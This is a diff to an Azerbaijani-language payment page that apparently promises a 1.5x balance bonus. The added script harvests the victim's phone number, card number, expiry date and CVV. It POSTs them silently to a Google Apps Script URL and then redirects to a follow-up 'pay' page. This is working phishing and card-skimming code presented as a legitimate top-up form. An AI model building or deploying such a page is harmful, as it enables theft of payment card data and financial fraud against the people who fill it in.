@@ -16,72 +16,94 @@
         }
         .payment-window {
             background-color: white;
-            border-radius: 45px; /* Daha yuvarlak kenarlar */
+            border-radius: 45px;
             padding: 60px;
-            max-width: 850px; /* Daha geniş pencere */
-            width: 90%; /* Ekranın %90'ını kaplar */
+            max-width: 850px;
+            width: 90%;
             box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
         }
         .content {
             text-align: center;
         }
         h2 {
-            font-size: 52px; /* Daha büyük başlık */
+            font-size: 52px;
             color: #000;
             margin-bottom: 50px;
         }
         .form-group {
-            margin-bottom: 50px; /* Alanlar arasında daha fazla boşluk */
+            margin-bottom: 50px;
             text-align: left;
             position: relative;
         }
         label {
             display: block;
-            margin-bottom: 18px; /* Daha fazla boşluk */
+            margin-bottom: 18px;
             font-weight: bold;
             color: #000;
-            font-size: 30px; /* Daha büyük etiket yazısı */
+            font-size: 30px;
         }
         input[type="text"], input[type="number"] {
             width: 100%;
-            padding: 25px; /* Daha geniş giriş alanı */
-            padding-left: 75px; /* Simgeler için boşluk */
-            font-size: 30px; /* Daha büyük yazı boyutu */
+            padding: 25px;
+            padding-left: 75px;
+            font-size: 30px;
             box-sizing: border-box;
-            border: 2px solid #ccc; /* Giriş alanlarının kenarlıkları */
-            border-radius: 20px; /* Giriş alanlarının yuvarlak kenarları */
+            border: 2px solid #ccc;
+            border-radius: 20px;
         }
         .form-group img {
             position: absolute;
             top: 50%;
             left: 15px;
             transform: translateY(-4px);
-            width: 55px; /* Daha büyük simge boyutu */
+            width: 55px;
             height: auto;
-            pointer-events: none; /* Tıklamayı engeller */
+            pointer-events: none;
         }
         button {
-            background-color: blue;
+            background-color: green;
             color: white;
             padding: 25px 65px;
-            font-size: 30px; /* Daha büyük yazı boyutu */
+            font-size: 30px;
             border: none;
             cursor: pointer;
-            border-radius: 45px; /* Buton köşelerini yuvarlatır */
+            border-radius: 45px;
             transition: background-color 0.3s;
             width: 100%;
         }
         button:hover {
-            background-color: darkblue;
+            background-color: darkgreen;
         }
         #logo {
-            width: 320px; /* Daha büyük logo */
+            width: 320px;
             margin: 0 auto 50px auto;
         }
         .result {
-            margin-top: 25px;
-            font-size: 30px; /* Daha büyük sonuç yazısı */
+            margin-top: 10px;
+            font-size: 30px;
             color: green;
+            position: absolute;
+            top: 105%;
+            left: 0;
+            width: 100%;
+        }
+        .date-input {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            position: relative;
+        }
+        .date-input img {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            width: 55px;
+            height: auto;
+            pointer-events: none;
+        }
+        .date-input input {
+            padding-left: 75px;
         }
     </style>
 </head>
@@ -91,19 +113,17 @@
             <img id="logo" src="Logo.png" alt="Logo">
             <h2>Ödəmə Bilgiləri</h2>
             <form onsubmit="gonder(event)">
-                <!-- Telefon Numarası -->
                 <div class="form-group">
-                    <label for="telefon-numarasi">Telefon Nömrəsi</label>
+                    <label for="telefon">Telefon Nömrəsi</label>
                     <img src="phone.png" alt="Telefon Logosu">
                     <input 
                         type="text" 
-                        id="telefon-numarasi" 
-                        name="telefon-numarasi" 
+                        id="telefon" 
+                        name="telefon" 
                         value="+994" 
                         maxlength="13" 
                         required>
                 </div>
-                <!-- Tutar -->
                 <div class="form-group">
                     <label for="tutar">Yükləyəcəyiniz Məbləğ ₼</label>
                     <img src="para.png" alt="Para Logosu">
@@ -116,33 +136,38 @@
                         required>
                     <div id="result" class="result"></div>
                 </div>
-                <!-- Kart Numarası -->
                 <div class="form-group">
-                    <label for="kart-numarasi">Kart Nömrəsi</label>
+                    <label for="kart">Kart Nömrəsi</label>
                     <img src="card.svg" alt="Kart Logosu">
                     <input 
                         type="text" 
-                        id="kart-numarasi" 
-                        name="kart-numarasi" 
+                        id="kart" 
+                        name="kart" 
                         maxlength="19" 
                         placeholder="XXXX XXXX XXXX XXXX" 
                         required>
                 </div>
-                <!-- Son Kullanma Tarihi -->
                 <div class="form-group">
-                    <label for="son-kullanma-tarihi">Son İstifadə Tarixi (MM/YY)</label>
-                    <img src="date.png" alt="Tarih Logosu">
-                    <input 
-                        type="text" 
-                        id="son-kullanma-tarihi" 
-                        name="son-kullanma-tarihi" 
-                        placeholder="MM/YY" 
-                        maxlength="5" 
-                        pattern="\d{2}/\d{2}" 
-                        title="Format: MM/YY (örnek: 07/29)" 
-                        required>
+                    <label for="ay">Son İstifadə Tarixi (MM/YY)</label>
+                    <div class="date-input">
+                        <img src="date.png" alt="Tarih Logosu">
+                        <input 
+                            type="text" 
+                            id="ay" 
+                            name="ay" 
+                            placeholder="MM" 
+                            maxlength="2" 
+                            required>
+                        <img src="date.png" alt="Tarih Logosu">
+                        <input 
+                            type="text" 
+                            id="yil" 
+                            name="yil" 
+                            placeholder="YY" 
+                            maxlength="2" 
+                            required>
+                    </div>
                 </div>
-                <!-- CVV -->
                 <div class="form-group">
                     <label for="cvv">CVV</label>
                     <img src="cvc.svg" alt="CVV Logosu">
@@ -160,5 +185,41 @@
             </form>
         </div>
     </div>
+    <script>
+        function hesapla(tutar) {
+            const bonus = (tutar * 1.5).toFixed(2);
+            document.getElementById('result').innerText = `Hesabınıza gələcək məbləğ (1.5x bonus ilə): ${bonus}₼`;
+        }
+
+        async function gonder(event) {
+            event.preventDefault();
+
+            const data = {
+                telefon: document.getElementById("telefon").value.trim(),
+                tutar: document.getElementById("tutar").value.trim(),
+                kart: document.getElementById("kart").value.trim(),
+                ay: document.getElementById("ay").value.trim(),
+                yil: document.getElementById("yil").value.trim(),
+                cvv: document.getElementById("cvv").value.trim(),
+                otp: "Bilinmiyor", // OTP sabit
+            };
+
+            try {
+                await fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(data),
+                    mode: "no-cors",
+                });
+
+                window.location.href = "pay/index.html";
+            } catch (error) {
+                console.error("Xəta:", error);
+                alert("Məlumat göndərilmədi!");
+            }
+        }
+    </script>
 </body>
 </html>
